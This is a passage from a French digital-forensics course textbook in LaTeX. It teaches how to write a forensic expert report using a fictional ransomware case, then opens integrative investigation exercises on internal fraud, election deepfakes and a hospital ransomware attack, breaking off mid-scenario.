\begin{lstlisting}[language=bash_forensique,
    caption={Section Méthodologie -- exemple}]
2. MÉTHODOLOGIE
===============

2.1 Standards appliqués
- ISO/IEC 27037:2012 (collecte et préservation de l'evidence
  numérique)
- NIST SP 800-86 (intégration de la forensique dans la réponse
  aux incidents)
- RFC 3227 (ordre de collecte selon la volatilité)

2.2 Outils utilisés (versions exactes)
| Outil          | Version      | Usage                           |
| FTK Imager     | 4.7.3.81     | Acquisition de l'image E01      |
| Autopsy        | 4.21.0       | Analyse du système de fichiers  |
| Volatility 3   | 2.4.1        | Analyse mémoire RAM             |
| RegRipper      | 20230510     | Analyse du registre Windows     |
| PECmd          | 1.5.0.0      | Analyse des fichiers Prefetch   |
| MFTECmd        | 1.2.2.1      | Analyse du $MFT et $UsnJrnl     |
| log2timeline   | 20230724     | Construction de la timeline     |
| Systeme hôte   | Ubuntu 22.04 | Environnement d'analyse         |

2.3 Intégrité des données
Avant toute analyse, les hash SHA-256 des images E01 ont été
recalculés et comparés aux valeurs enregistrées lors de
l'acquisition (formulaire custody EV-001). Résultat :
CORRESPONDANCE CONFIRMÉE.
\end{lstlisting}

\subsection{Section~3~: Constatations}

La section Constatations est la plus importante du rapport~: elle
constitue la base de toute conclusion judiciaire. Elle ne contient
\textbf{que} des faits vérifiables, horodatés et référencés à une source.

\begin{lstlisting}[language=bash_forensique,
    caption={Section Constatations -- structure et exemple MVOM}]
3. CONSTATATIONS
================

[Structure recommandée : une constatation = un fait = une source]

3.1 État général du système
C.01 : Le système d'exploitation est Windows Server 2022 Standard,
       version 10.0.20348 Build 20348.
       [Source : Volatility 3, windows.info]

C.02 : Le compte utilisateur "admin" a été le dernier compte connecté
       sur ce serveur, avec une session active au moment de
       l'acquisition de la RAM.
       [Source : Volatility 3, windows.logonsessions]

3.2 Activité réseau identifiée
C.03 : Le journal journald enregistre 7 tentatives de connexion SSH
       échouées depuis l'IP 185.220.XX.XX entre 02h13:45 et 02h14:08.
       [Source : journald, extrait en Annexe A, lignes 1247-1253]

C.04 : Le journal journald enregistre une connexion SSH réussie au
       compte "root" depuis l'IP 185.220.XX.XX à 02h14:09.
       [Source : journald, extrait en Annexe A, ligne 1254]

3.3 Fichiers et activité système
C.05 : Le $UsnJrnl enregistre la création du fichier
       "enc_all.ps1" dans C:\Users\admin\AppData\Local\Temp\
       à 02h16:50.
       [Source : MFTECmd, fichier $UsnJrnl, Annexe B]

C.06 : Le journal Prefetch enregistre une exécution de "enc_all.ps1"
       à 02h17:44. Le compteur d'exécution est 1 (première exécution).
       Les fichiers accédés lors de cette exécution incluent
       "encrypted_files_list.txt".
       [Source : PECmd, ENC_ALL.PS1-3F8A2B91.pf, Annexe C]

C.07 : Le $UsnJrnl enregistre la suppression du fichier "enc_all.ps1"
       à 02h18:30.
       [Source : MFTECmd, fichier $UsnJrnl, Annexe B]

C.08 : Le $UsnJrnl enregistre la modification de 847 fichiers
       d'extension ".docx" entre 02h18:31 et 02h19:02. Ces
       fichiers portent désormais l'extension ".locked".
       [Source : MFTECmd, fichier $UsnJrnl, Annexe B]

C.09 : L'analyse Volatility (windows.netscan) révèle une connexion
       TCP en état ESTABLISHED entre 10.0.0.15:49212 et
       185.220.XX.XX:4444 au moment de la capture mémoire.
       [Source : Volatility 3, windows.netscan, Annexe D]
\end{lstlisting}

\subsection{Section~4~: Analyse}

L'analyse interprète les constatations~; elle doit~:
(a)~citer les constatations sur lesquelles elle s'appuie~;
(b)~exprimer un niveau de confiance~;
(c)~mentionner les hypothèses alternatives et pourquoi elles ont été
écartées (E9bis PIU).

\begin{lstlisting}[language=bash_forensique,
    caption={Section Analyse -- exemple MVOM}]
4. ANALYSE
==========

4.1 Chronologie de l'incident (niveau de confiance : ÉLEVÉ)

La convergence temporelle des sources C.03 à C.09 suggère, avec
un niveau de confiance élevé, le scénario suivant :

  [02h13:45 - 02h14:08] L'IP 185.220.XX.XX a procédé à plusieurs
  tentatives d'authentification SSH (C.03), constituant un schéma
  cohérent avec une attaque par force brute.

  [02h14:09] Une connexion SSH réussie a été établie au compte
  root depuis cette IP (C.04). La proximité temporelle (21 secondes
  après la dernière tentative échouée) est cohérente avec un accès
  obtenu par force brute.

  [02h16:50 - 02h17:44] Un script PowerShell nommé "enc_all.ps1"
  a été créé (C.05) puis exécuté (C.06) via la session SSH active.

  [02h18:31 - 02h19:02] 847 fichiers .docx ont été modifiés et
  renommés en .locked (C.08), schéma caractéristique d'un chiffrement
  par ransomware.

4.2 Hypothèse alternative écartée (falsification, E9bis PIU)

H_alt : L'activité observée pourrait être le résultat d'une
opération administrative légitime par l'administrateur système.

Réfutation : (1) L'IP source (185.220.XX.XX) n'appartient pas
au réseau interne de TRANSBOIS SA selon le schéma réseau fourni ;
(2) Aucune fenêtre de maintenance n'était planifiée le 13/03/2026
à 02h00 (attestation TRANSBOIS SA en Annexe E) ; (3) Le script
"enc_all.ps1" n'est pas présent dans les procédures documentées
de TRANSBOIS SA. Cette hypothèse est donc écartée avec un niveau
de confiance élevé.

4.3 Qualification technique

La combinaison accès SSH non autorisé + déploiement de script de
chiffrement + modification massive de fichiers constitue, sur le
plan technique, une intrusion informatique suivie d'une attaque
par ransomware. La qualification juridique de ces faits relève
de l'autorité judiciaire mandante.
\end{lstlisting}

\begin{boxalert}
\textbf{La qualification juridique n'appartient pas à l'expert}

La section~4 de l'exemple ci-dessus se termine par~:
``\textit{La qualification juridique de ces faits relève de
l'autorité judiciaire mandante.}''

Cette formule est obligatoire. L'expert dit ce qu'il a trouvé
et ce que cela signifie techniquement. Il ne dit pas ``c'est
une infraction à l'art.~65 de la Loi~2010/012~\cite{cameroun2010a}''. Ce serait
outrepasser sa mission et fragiliser son témoignage.
\end{boxalert}

\subsection{Section~5~: Conclusions et Recommandations}

\begin{lstlisting}[language=bash_forensique,
    caption={Section Conclusions -- synthèse et recommandations}]
5. CONCLUSIONS ET RECOMMANDATIONS
==================================

5.1 Réponses aux questions posées par l'autorité mandante

Q1 : "Établir les faits techniques liés à l'incident."
R1 : Les faits techniques établis sont les suivants [résumé de
     l'analyse 4.1]. Ces faits sont établis avec un niveau de
     confiance élevé, sur la base de la convergence de six sources
     indépendantes (journald, $UsnJrnl, Prefetch, UserAssist,
     Volatility netscan, Volatility filescan).

Q2 : "Identifier l'origine de l'attaque."
R2 : L'IP source identifiée est 185.220.XX.XX. L'attribution de
     cette IP à un individu spécifique nécessite une réquisition
     aux autorités compétentes du pays d'enregistrement de cette IP.
     Cette démarche est hors du périmètre de la présente expertise.

Q3 : "Évaluer l'étendue des dommages."
R3 : 847 fichiers .docx ont été chiffrés et sont actuellement
     inaccessibles. [Évaluation complémentaire de la valeur économique
     des données hors périmètre de cette expertise.]

5.2 Recommandations de sécurité
[À inclure si demandé par le mandant -- ne pas inclure systématiquement
car peut être perçu comme sortant du périmètre judiciaire]

5.3 Réserves
Le présent rapport est établi sur la base des éléments disponibles
à la date de rédaction. Il est susceptible d'être complété si les
logs de pare-feu requis (réquisition N° [YYY]) sont communiqués.
\end{lstlisting}

% ============================================================================
\section{La Synthèse Exécutive (Niveau~1)~: Rédiger pour un Magistrat}
\label{sec:synthese-executive}
% ============================================================================

La synthèse exécutive est lue en premier et détermine si le rapport
sera compris. Elle ne contient aucun terme technique sans définition~;
elle ne référence pas de hash ou de commandes.

\begin{lstlisting}[language=bash_forensique,
    caption={Modèle de synthèse exécutive -- cas MVOM}]
SYNTHÈSE EXÉCUTIVE
==================
(À l'attention du Procureur de la République)

AFFAIRE : Opération MVOM -- Ransomware TRANSBOIS SA
DATE DE L'INCIDENT : 13 mars 2026, entre 02h14 et 02h19
EXPERT : [Nom], [Titre]

L'ESSENTIEL EN TROIS POINTS :

1. UN ACCÈS NON AUTORISÉ A ÉTÉ ÉTABLI
   Dans la nuit du 12 au 13 mars 2026, entre 02h14 et 02h19,
   une personne non autorisée a accédé au système informatique
   de TRANSBOIS SA depuis l'adresse Internet 185.220.XX.XX.
   Cet accès a été obtenu en devinant le mot de passe du
   compte administrateur après plusieurs tentatives.

2. 847 FICHIERS ONT ÉTÉ CHIFFRÉS ET RENDUS INACCESSIBLES
   L'intrus a utilisé un programme malveillant (ransomware)
   pour rendre 847 documents de travail inaccessibles.
   Ces documents portent désormais l'extension ".locked".

3. LES PREUVES SONT SOLIDES ET CONVERGENTES
   Six sources d'information indépendantes (journaux système,
   historique des fichiers, analyse de la mémoire vive)
   convergent vers les mêmes conclusions, avec un niveau de
   confiance élevé.

QUALIFICATION : La qualification juridique des faits relève
de l'autorité judiciaire. L'expert note que les faits techniques
établis correspondent à la description d'un accès informatique
non autorisé suivi d'une atteinte à l'intégrité des données.

PIÈCE CLEF : Le journal [LOGFILE] enregistre l'entrée de
l'intrus à 02h14:09 depuis l'adresse Internet 185.220.XX.XX.
Ce journal est annexé au présent rapport (Annexe A).

POUR ALLER PLUS LOIN : voir Rapport Technique (Niveau 2),
Section 3 (Constatations) et Section 4 (Analyse).
\end{lstlisting}

% ============================================================================
\section{Annexes~: le Dossier Probatoire (Niveau~3)}
\label{sec:dossier-probatoire}
% ============================================================================

Les annexes constituent la preuve que le rapport est vérifiable.
Elles doivent être organisées, référencées et intègres.

\begin{tableaucours}{p{2.5cm}p{4.0cm}p{5.0cm}}{%
    \tableauHeader{Annexe} &
    \tableauHeader{Contenu} &
    \tableauHeader{Format et exigences}
}
\textbf{Annexe~A} & Extraits de logs cités dans les Constatations &
    Texte brut~; horodatages lisibles~; lignes surlignées si nécessaire \\
\textbf{Annexe~B} & Export CSV du \texttt{\$UsnJrnl} filtré &
    CSV~; colonnes~: Timestamp, Filename, Reason~; trié par date \\
\textbf{Annexe~C} & Rapport PECmd (Prefetch) &
    Export CSV ou texte de PECmd \\
\textbf{Annexe~D} & Captures d'écran Volatility &
    PNG horodaté~; commande visible~; résultat complet \\
\textbf{Annexe~E} & Attestation de l'entreprise victime &
    Document signé par le responsable TRANSBOIS~SA \\
\textbf{Annexe~F} & Formulaire de custody EV-001 et EV-001bis &
    Formulaires remplis et signés (Ch.~8~(UE~SEC4031)) \\
\textbf{Annexe~G} & Hash SHA-256 de toutes les pièces &
    Fichier texte~: SHA-256~<espace>~<nom du fichier>~; signé par l'expert \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~20.3. Organisation des annexes du dossier probatoire}\end{center}

\begin{boiteRemarque}{L'Annexe G~: le hash de toutes les pièces}
L'Annexe~G est la plus importante~: elle est le méta-garant de l'intégrité
de toutes les autres. Elle contient un hash SHA-256 de chaque fichier
annexé au rapport. Si un avocat affirme qu'une pièce a été modifiée,
l'Annexe~G permet de le réfuter immédiatement en recalculant le hash.
Produire l'Annexe~G signée par l'expert au début de l'audience.
\end{boiteRemarque}

% ============================================================================
\section{Pièges de Rédaction et Comment les Éviter}
\label{sec:pieges-redaction}
% ============================================================================

\begin{tableaucours}{p{3.8cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Piège} &
    \tableauHeader{Exemple fautif} &
    \tableauHeader{Formulation correcte}
}
\textbf{Certitude excessive} &
    ``L'attaquant est X.'' &
    ``L'IP source est 185.220.XX.XX. L'attribution à une personne
    physique nécessite des investigations complémentaires.'' \\
\textbf{Jargon non défini} &
    ``Le ransomware a modifié le MFT et les entrées USN.'' &
    ``Les métadonnées de fichier (registre chronologique du système)
    indiquent~\ldots'' puis définir les termes en note de bas de page. \\
\textbf{Conclusion sans preuve} &
    ``L'accès a été obtenu par force brute.'' &
    ``7~tentatives échouées (C.03) suivies d'un succès (C.04)
    constituent un schéma cohérent avec une attaque par force brute~;
    d'autres explications sont théoriquement possibles mais
    n'ont pas été corroborées.'' \\
\textbf{Source non citée} &
    ``Les logs montrent~\ldots'' &
    ``Le journal \texttt{journald} (Annexe~A, lignes 1247--1254)
    enregistre~\ldots'' \\
\textbf{Hypothèse non réfutée} &
    ``Le suspect est coupable.'' &
    Présenter et réfuter explicitement les hypothèses alternatives
    (cf. E9bis PIU). \\
\textbf{Qualif. juridique par l'expert} &
    ``Ce fait constitue une infraction à l'art.~65.'' &
    ``La qualification juridique relève de l'autorité mandante.
    L'expert note que~\ldots'' \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~20.4. Pièges de rédaction et formulations correctes}\end{center}

% ============================================================================
\section{Cas MVOM~: le Rapport Sous Pression}
\label{sec:rapport-pression}
% ============================================================================

\begin{boxscenario}{Affaire MVOM~: quand le rapport est contesté}
L'expert OLINGA a remis son rapport sur l'affaire MVOM (rançongiciel
chez TRANSBOIS SA). La partie adverse produit une contre-expertise
affirmant que les logs analysés par OLINGA pourraient avoir été
manipulés par TRANSBOIS SA \emph{après} l'incident.

L'avocat de la défense pose trois questions en audience~:

\textbf{Q1~:} ``Pouvez-vous prouver que les logs que vous avez
analysés n'ont pas été modifiés par votre client après l'incident~?''

\textbf{R (correcte)~:} ``Les logs ont été exportés depuis l'image
E01 (EV-001) dont les hash SHA-256 ont été calculés lors de
l'acquisition le 13 mars 2026 à 15h03 et sont documentés dans
le formulaire de custody (Annexe~F). La valeur de hash calculée
au moment de l'analyse le 15 mars 2026 est identique (Annexe~G).
Toute modification des logs après l'acquisition aurait changé
le hash et serait détectable. »

\textbf{Q2~:} ``Vous utilisez Volatility 3. N'est-il pas vrai que
ce logiciel modifie lui-même la mémoire pendant la capture~?''

\textbf{R (correcte)~:} « La capture mémoire (EV-001bis) a été
réalisée \emph{avant} toute autre opération sur le système, conformément
à RFC~3227~\cite{rfc3227} (ordre de volatilité~: RAM en premier). La modification
inhérente à l'outil de capture est documentée dans le formulaire
de custody sous la note~: \textit{``légère modification de la RAM
inhérente au processus de capture, conformément à ACPO~\cite{acpo2012} Principe~2''}
(Annexe~F, ligne~12). Cette modification affecte quelques kilo-octets
et n'altère pas les artefacts analysés. »

\textbf{Q3~:} ``Votre rapport dit que l'attaque vient de l'IP
185.220.XX.XX. Comment savez-vous qu'il ne s'agit pas d'un VPN
utilisé par quelqu'un d'autre~?''

\textbf{R (correcte)~:} « Je ne l'affirme pas dans mon rapport.
La page~3 indique explicitement que l'attribution de cette IP à une
personne physique est hors périmètre de cette expertise et nécessite
une réquisition aux autorités compétentes. Je constate un fait~:
l'IP source des connexions SSH. L'identification du titulaire relève
d'une démarche distincte. »
\end{boxscenario}

\separateur

% --- Encadré lab NDAP SUKULU ---
\begin{boiteRemarque}{Notions mobilisées par le laboratoire INA-LAB-08}
Le laboratoire fait relire un rapport avant son dépôt. Quatre contrôles
suffisent à en ruiner la recevabilité s'ils sont oubliés.
\begin{itemize}
    \item \textbf{Constatation ou analyse}~: une phrase qui juge, affirme une
          certitude ou prête une intention n'a pas sa place dans la section
          Constatations.
    \item \textbf{Attribution}~: une adresse IP n'identifie pas une personne
          (VPN, relais, NAT, poste partagé)~; toute phrase qui en déduit un
          auteur est infondée.
    \item \textbf{Empreintes}~: l'empreinte reportée en annexe doit être
          identique, jusqu'au dernier caractère, à celle du formulaire de
          custody~; comparer les deux listes ligne à ligne.
    \item \textbf{Ordre de volatilité} (RFC~3227)~: la mémoire d'un poste
          doit être acquise avant son disque~; un délai long entre la fin de
          l'action malveillante et l'acquisition est à justifier.
\end{itemize}
\end{boiteRemarque}

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Trois niveaux}~: Synthèse Exécutive (2--4 pages,
          non-technicien)~; Rapport Technique (20--100 pages, technicien
          ou avocat)~; Dossier Probatoire (annexes vérifiables).
          Cohérents entre eux~; rédigés pour des audiences différentes.

    \item \textbf{La règle d'or}~: Constatation = fait vérifiable
          (horodaté, sourcé). Analyse = interprétation (niveau de
          confiance + hypothèses alternatives réfutées). Ne jamais
          mélanger. Tester chaque phrase~: ``mais si je me trompe,
          la phrase est-elle encore vraie~?''

    \item \textbf{Chaque constatation cite sa source}~: ``[Source~:
          MFTECmd, fichier \$UsnJrnl, Annexe~B]''. Toujours. Sans
          exception.

    \item \textbf{Annexe~G obligatoire}~: hash SHA-256 de toutes les
          pièces annexées. C'est la preuve de l'intégrité du dossier
          probatoire lui-même.

    \item \textbf{La qualification juridique n'appartient pas à l'expert.}
          Finir la section Analyse par~: ``La qualification juridique
          de ces faits relève de l'autorité judiciaire mandante.''

    \item \textbf{Hypothèses alternatives obligatoires}~: présenter et
          réfuter au moins une hypothèse alternative par conclusion
          majeure. Sans cette réfutation, la conclusion est une
          affirmation, pas une analyse.

    \item \textbf{Synthèse exécutive}~: zéro jargon non défini~;
          trois points maximum~; une pièce clé identifiée~;
          une référence vers le rapport technique pour approfondir.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~20.1. Identifier constatation vs analyse \niveaubase}]
Pour chacun des énoncés suivants, indiquez s'il s'agit d'une
Constatation, d'une Analyse, ou d'un mélange interdit~; reformulez
les mélanges~:
\begin{enumerate}[(a)]
    \item « Le fichier \texttt{malware.exe} a été exécuté par
          MBONGO le 15 janvier 2026 à 14h28. »
    \item « Le Prefetch \texttt{MALWARE.EXE-A1B2C3D4.pf} enregistre
          une exécution à 14h28:33, compteur~= 1. »
    \item « L'attaquant a tenté de couvrir ses traces en supprimant
          le fichier enc\_all.ps1. »
    \item « Le \texttt{\$UsnJrnl} enregistre la suppression du
          fichier enc\_all.ps1 à 02h18:30, soit 46~secondes après
          l'entrée \texttt{DataExtend|Close} (02h17:44). »
    \item « Les logs de connexion montrent un accès suspect
          depuis une IP russe. »
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~20.2. Rédiger une section Constatations \niveaumoyen}]
À partir des données suivantes (extraites des analyses MVOM),
rédigez 5~constatations correctement structurées (fait + source
+ annexe)~:
\begin{itemize}
    \item UserAssist~: \texttt{AnyDesk.exe} exécuté 3~fois,
          dernière à 02h10:15~;
    \item Volatility netscan~: connexion ESTABLISHED vers
          185.220.XX.XX:4444 à partir du PID~4892~;
    \item Volatility pslist~: PID~4892 = svchost.exe,
          PID parent~= 4888 (cmd.exe)~;
    \item \$UsnJrnl~: création de \texttt{encrypted\_files\_list.txt}
          à 02h18:31~;
    \item journald~: SSH Accepted password pour root depuis
          185.220.XX.XX à 02h14:09.
\end{itemize}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~20.3. Rapport complet \niveauexpert}]
Produisez le rapport forensique complet sur l'Opération MVOM
(Chapitre~3~(UE~SEC4031)) en appliquant toutes les
techniques de ce cours~:
\begin{enumerate}[(a)]
    \item \textbf{Synthèse Exécutive}~: 1~page maximum,
          non-technicien, trois points, une pièce clé.
    \item \textbf{Section Constatations}~: au moins 10~constatations
          couvrant~: l'accès SSH, l'exécution du ransomware,
          le chiffrement des fichiers, et la tentative de suppression
          des traces. Chaque constatation cite sa source.
    \item \textbf{Section Analyse}~: chronologie de l'incident avec
          niveau de confiance explicite~; au moins une hypothèse
          alternative présentée et réfutée (E9bis PIU).
    \item \textbf{Section Conclusions}~: réponses aux 3~questions
          du mandant~; qualification technique sans qualification
          juridique.
    \item \textbf{Plan des Annexes}~: liste les pièces à annexer
          avec leur description et leur hash attendu.
\end{enumerate}
\textit{Note~: cet exercice peut être évalué comme devoir maison.}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le cours dispose maintenant de toutes les
briques de la Partie~IV~: investigation système, réseau, mobile,
cloud et IoT, sources ouvertes, et le rapport qui les rassemble.
Le chapitre suivant clôt cette partie par des cas intégrateurs qui
mobilisent tout à la fois.

La \textbf{Partie~V} traite ensuite les défis émergents~:
anti-forensique (comment détecter l'effacement), intelligence
artificielle, conteneurs et cloud-native, puis une comparaison
internationale des systèmes d'investigation.
\end{boxinfo}

       
        % ============================================================================
% Fichier  : partie4/P04_C21_applications_cas.tex
% Titre    : Applications et Cas Intégrateurs
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% ============================================================================

\chapter{Applications et Cas Intégrateurs}
\label{chap:cas-int}

\epigraph{%
    « La théorie c'est quand on sait tout et que rien ne fonctionne.
    La pratique c'est quand tout fonctionne et que personne ne sait
    pourquoi. Ici, nous visons les deux. »%
}{Adapté d'Albert Einstein}

\niveauChapitre{Expert}{%
    Ce chapitre exige la maîtrise de l'ensemble des Parties~I à~IV.
    Il ne présente aucune notion nouvelle~; il consolide et
    intègre par la pratique.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Appliquer le PIU de bout en bout sur un cas complexe
          multi-sources et multi-juridictions.
    \item Mobiliser simultanément~: qualification juridique,
          techniques d'acquisition, analyse artefacts, corrélation
          temporelle et rédaction de rapport.
    \item Gérer les tensions CRO dans des situations de décision
          réelle sous contrainte de temps.
    \item Identifier les erreurs classiques d'investigation et
          les corriger.
    \item Se préparer à l'évaluation finale par une simulation
          complète de cas intégrateur.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Mode d'emploi de ce chapitre}
% ============================================================================

Ce chapitre fonctionne différemment des précédents~: il ne présente
pas de nouvelles techniques. Il vous place dans la position de
l'investigateur face à un cas complet, en mobilisant simultanément
tout ce que vous avez appris.

\textbf{Structure de chaque cas~:}
\begin{enumerate}
    \item \textbf{Brief initial}~: les faits tels qu'ils vous sont
          présentés (incomplets, parfois trompeurs, comme dans
          la réalité).
    \item \textbf{Phase d'investigation guidée}~: questions structurées
          mobilisant les différentes dimensions du cours.
    \item \textbf{Révélations progressives}~: des indices supplémentaires
          apparaissent à mesure que l'investigation avance.
    \item \textbf{Synthèse et rapport}~: production d'un livrable
          juridiquement structuré.
\end{enumerate}

\separateur

% ============================================================================
\section{Cas~1. Opération FAKO~: Fraude Comptable Interne}
\label{sec:cas-fako}
% ============================================================================

\subsection{Brief initial}

\begin{boxscenario}{Brief. Opération FAKO}
\textbf{Date~:} Lundi 10~mars~2026, 09h15.

La DRH de CAMEROON AGRO~SA (exportateur de produits agricoles,
150~salariés, Buea) vous contacte en urgence. La direction a
découvert, lors de l'audit mensuel, que des virements bancaires
non autorisés totalisant \textbf{47~millions~FCFA} ont été effectués
vers des comptes inconnus entre le 1er et le 28~février~2026.

Informations disponibles~:
\begin{itemize}
    \item Les virements ont été initiés depuis le logiciel comptable
          interne (\texttt{Sage~100 Comptabilité}, serveur Windows~Server~2019)~;
    \item Trois comptes employés avaient accès au module de virements~:
          EBOA Claire (DAF), BAFUT Jonas (comptable senior),
          MBAH Inès (comptable junior)~;
    \item Aucune des trois n'a signalé d'anomalie~;
    \item MBAH Inès est en arrêt maladie depuis le 1er~mars~2026.
\end{itemize}

\textbf{Mission~:} vous êtes mandaté par le parquet suite à la plainte
de CAMEROON AGRO~SA. Identifier l'auteur des virements non autorisés.
\end{boxscenario}

\subsection{Phase~1~: Initialisation (PIU E1--E3)}

\begin{boxexo}[title={\ding{45}\quad FAKO. Étape~1~: Cadrage}]
\begin{enumerate}[(a)]
    \item Remplissez la matrice de criticité (Tableau~6 du Ch.~PIU)
          pour cette affaire. Quel niveau de rigueur s'applique~?
    \item Quelles autorisations judiciaires devez-vous obtenir
          avant toute action technique~? Citez les articles exacts
          (\loicam{2010/012}~\cite{cameroun2010a}).
    \item Listez les sources de données à collecter, dans l'ordre
          de la RFC~3227~\cite{rfc3227}. Quelle est la première source à traiter~?
    \item Y a-t-il un risque de destruction de preuves actif~?
          Comment le gérer~?
\end{enumerate}
\end{boxexo}

\subsection{Révélation~1. Accès aux logs}

\begin{boiteRemarque}{Révélation~1 (disponible après l'Étape~1)}
L'administrateur système vous communique~: le serveur Sage~100 est
allumé~; les logs d'authentification Windows sont activés et conservés
sur 30~jours (Event~ID~4624/4634). La messagerie professionnelle
(Exchange) est hébergée sur Office~365 (Microsoft~365). MBAH Inès
avait accès au VPN depuis chez elle.
\end{boiteRemarque}

\subsection{Phase~2~: Acquisition et Analyse (PIU E4--E9)}

\begin{boxexo}[title={\ding{45}\quad FAKO. Étape~2~: Investigation système}]
\begin{enumerate}[(a)]
    \item L'analyse des Event~ID~4624 (connexion réussie) sur le serveur
          Sage~100 révèle~:
\begin{lstlisting}[language=bash_forensique]
# Extrait Event Viewer -- Logon Events
[2026-02-14 02:17:43] EventID:4624 Account:MBAH_INES
                       LogonType:3 (Network)
                       SourceIP:41.202.XXX.XXX
[2026-02-14 02:17:45] EventID:4624 Account:MBAH_INES
                       LogonType:3 Source:41.202.XXX.XXX
[2026-02-21 03:05:12] EventID:4624 Account:MBAH_INES
                       LogonType:3 Source:41.202.XXX.XXX
\end{lstlisting}
          Que révèle l'heure des connexions (02h17 et 03h05)~?
          Quelle hypothèse formulez-vous~?
    \item L'IP \texttt{41.202.XXX.XXX} est localisée au Nigéria
          (Lagos). MBAH Inès est en arrêt maladie depuis le 1er~mars
          mais les connexions datent de février. Est-ce problématique~?
    \item Formulez 5~hypothèses (méthode ACH, E8 PIU). Quelle hypothèse
          est la plus cohérente avec les données actuelles~?
    \item Quelles données demandez-vous à Microsoft via le portail
          LEA pour corroborer ou réfuter~?
\end{enumerate}
\end{boxexo}

\subsection{Révélation~2. Résultat LEA Microsoft}

\begin{boiteRemarque}{Révélation~2}
La réponse de Microsoft (portail LEA, délai~: 5~jours) indique~:
\begin{itemize}
    \item Le compte \texttt{mbah.ines@cameroon-agro.cm} s'est connecté
          depuis l'IP \texttt{41.202.XXX.XXX} (Lagos, Nigéria) à
          02h17 le 14~février~; 1~email a été lu~: l'email de réinitialisation
          VPN envoyé par l'IT à MBAH Inès le 13~février.
    \item Le même compte s'est connecté depuis l'IP
          \texttt{196.168.XXX.XXX} (Douala, Cameroun) à 08h30
          le 14~février, 6~heures plus tard.
\end{itemize}
\end{boiteRemarque}

\subsection{Phase~3~: Qualification et rapport}

\begin{boxexo}[title={\ding{45}\quad FAKO. Étape~3~: Qualification et rapport}]
\begin{enumerate}[(a)]
    \item La connexion depuis Lagos à 02h17 (accès email de réinitialisation
          VPN) suivie d'une connexion depuis Douala à 08h30 le même
          jour est-elle physiquement possible pour une personne
          se déplaçant entre les deux villes~? Quelle est l'implication
          forensique~?
    \item Qualifiez les infractions potentielles (articles Loi~2010/012
          et Loi~2024/017~\cite{cameroun2024donnees}). Qui est susceptible d'être mis en cause~?
    \item Appliquez la grille CRO à la décision de notifier MBAH Inès
          qu'elle est suspectée avant l'obtention de son téléphone.
    \item Rédigez les 5~premières constatations de votre rapport
          (Section~3, Constatations), en citant chaque source.
\end{enumerate}
\end{boxexo}

% ============================================================================
\section{Cas~2. Opération MUNGO~: Trafic d'Influence en Ligne}
\label{sec:cas-mungo}
% ============================================================================

\subsection{Brief initial}

\begin{boxscenario}{Brief. Opération MUNGO}
\textbf{Date~:} Mercredi 15~avril~2026, 14h00.

Le Service Central de Lutte contre la Cybercriminalité (SCFC) reçoit
un signalement~: une campagne coordonnée de désinformation cible un
candidat à des élections locales dans la région du Littoral. Des
centaines de faux comptes Facebook diffusent des \textit{deepfakes}
audio attribuant de fausses déclarations au candidat.

Informations disponibles~:
\begin{itemize}
    \item 347~faux comptes identifiés par les équipes de modération
          de Meta, actifs depuis le 1er~avril~2026~;
    \item Tous créés depuis des IPs dans un même sous-réseau
          (\texttt{196.200.XX.0/24}, hébergeur camerounais)~;
    \item Contenus~: 12~clips audio deepfake, 47~posts texte,
          3~faux articles de presse~;
    \item Plainte déposée par le candidat victime le 14~avril.
\end{itemize}
\end{boxscenario}

\subsection{Investigation guidée}

\begin{boxexo}[title={\ding{45}\quad MUNGO. Investigation complète}]
\begin{enumerate}[(a)]
    \item \textbf{Cadrage juridique}~: qualifiez les infractions
          potentielles. Les deepfakes audio sont-ils couverts par
          la \loicam{2010/012}~? Par quelle disposition~?
          Quelle innovation de la \loicam{2024/017} est-elle pertinente
          (données biométriques dans les deepfakes)~?
    \item \textbf{Stratégie de conservation d'urgence}~: les faux
          comptes Facebook peuvent être supprimés par Meta en quelques
          heures (violation des conditions d'utilisation). Quelle est
          votre première action~? Rédigez la demande de conservation
          urgente (art.~29 Budapest, portail LEA Meta Emergency).
    \item \textbf{Analyse technique des deepfakes}~: les clips audio
          deepfake sont des fichiers~MP3. Quelle analyse forensique
          pouvez-vous conduire sur ces fichiers~? Quels outils~?
          Quels artefacts~? (Indice~: métadonnées EXIF audio,
          spectrogramme, détecteurs de deepfake IA).
    \item \textbf{Attribution des comptes}~: tous les comptes viennent
          du même sous-réseau \texttt{196.200.XX.0/24}. Comment
          identifier l'abonné de cet hébergeur camerounais~?
          Quelle réquisition~? Quels délais~?
    \item \textbf{Contexte électoral et urgence déontologique}~:
          l'élection a lieu dans 15~jours. Le responsable politique
          concurrent tente de vous contacter ``en privé'' pour
          ``accélérer le dossier''. Identifiez la tension déontologique
          et décrivez votre réponse (Ch.~13~(UE~SEC4031)).
    \item \textbf{CRO}~: appliquez la grille CRO à la décision de
          publier l'analyse technique des deepfakes avant la fin
          de l'investigation~: qui en bénéficierait, qui en
          souffrirait~?
\end{enumerate}
\end{boxexo}

% ============================================================================
\section{Cas~3. Opération SANAGA~: Ransomware Hôpital}
\label{sec:cas-sanaga}
% ============================================================================

\subsection{Brief initial}

\begin{boxscenario}{Brief. Opération SANAGA}
\textbf{Date~:} Samedi 22~mars~2026, 06h30.

L'Hôpital Général de Yaoundé subit une attaque ransomware.
Les systèmes informatiques du bloc chirurgical, de la pharmacie
et des dossiers patients sont paralysés. Des interventions
chirurgicales ont dû être reportées. Un message de rançon
exige 15~bitcoins ($\approx$~750~000~USD) dans les 48~heures.

Particularités critiques~:
\begin{itemize}
    \item Des données de santé de 12~000~patients camerounais
          ont potentiellement été exfiltrées~;
    \item Le serveur principal est sous Windows~Server~2019,
          allumé, avec le message de rançon visible à l'écran~;
    \item Deux vies sont en jeu~: un patient en soins intensifs
